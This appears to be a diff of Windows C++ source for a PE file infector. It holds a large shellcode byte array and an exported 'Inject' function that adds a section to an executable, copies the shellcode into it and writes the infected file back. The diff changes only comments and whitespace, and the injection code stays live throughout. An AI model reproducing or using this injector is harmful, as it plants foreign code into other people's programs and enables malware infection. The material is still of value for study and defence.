@@ -1,6 +1,4 @@
 #include<Windows.h>
-//wchar_t path[MAX_PATH] = L"test.exe";
-
 
 unsigned char shellcode[] = { 0xe8,0x0,0x0,0x0,0x0,0x58,0x55,0x89,0xe5,0x89,0xc3,0x5,0x80,0x7,0x0,0x0,
 0x81,0xc3,0x80,0x1d,0x1,0x0,0x68,0x0,0x0,0x0,0x0,0x68,0x5,0x0,0x0,0x0,
@@ -4606,6 +4604,7 @@ extern "C" __declspec(dllexport) void __cdecl Inject(LPVOID lppath)
 		return;
 	}
 	PIMAGE_FILE_HEADER pFileHeader = (PIMAGE_FILE_HEADER)&pNTHeader->FileHeader;  //通过NT头获取文件头
+
 	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNTHeader->OptionalHeader; //通过NT头获取可选文件头
 	PIMAGE_SECTION_HEADER pFirstSectiongHeader = IMAGE_FIRST_SECTION(pNTHeader);  //通过NT头获取第一个节表头
 	int sectionNum = pFileHeader->NumberOfSections++;                             //节表数加一
@@ -4630,8 +4629,6 @@ extern "C" __declspec(dllexport) void __cdecl Inject(LPVOID lppath)
 	ZeroMemory(pNewFile, newFileSize);
 	memcpy(pNewFile, lpMemory, pLastSectionHeader->PointerToRawData);
 	memcpy(pNewFile + pLastSectionHeader->PointerToRawData, shellcode, sizeof(shellcode));
-	//填补跳转指令
-	//memcpy(pNewFile + pLastSectionHeader->PointerToRawData + sizeof(shellcode), jmpOldOep, sizeof(jmpOldOep));
 	//写出文件
 	DWORD dwWrite = 0;
 	WriteFile(hFile, pNewFile, newFileSize, &dwWrite, NULL);
